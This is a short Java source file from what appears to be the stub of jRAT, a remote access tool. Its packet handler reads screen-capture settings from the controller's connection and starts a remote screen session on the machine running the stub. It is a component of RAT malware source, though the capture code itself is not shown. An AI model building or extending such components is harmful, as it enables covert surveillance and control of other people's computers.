package se.jrat.stub.packets.incoming;

import se.jrat.stub.Connection;
import se.jrat.stub.Screen;

public class Packet12RemoteScreen extends AbstractIncomingPacket {
	
	@Override
	public void read(Connection con) throws Exception {
		int size = con.readInt();
		int quality = con.readInt();
		int monitor = con.readInt();
		int columns = con.readInt();
		int rows = con.readInt();
		
		new Screen(con, size, quality, monitor, columns, rows).start();
	}

}
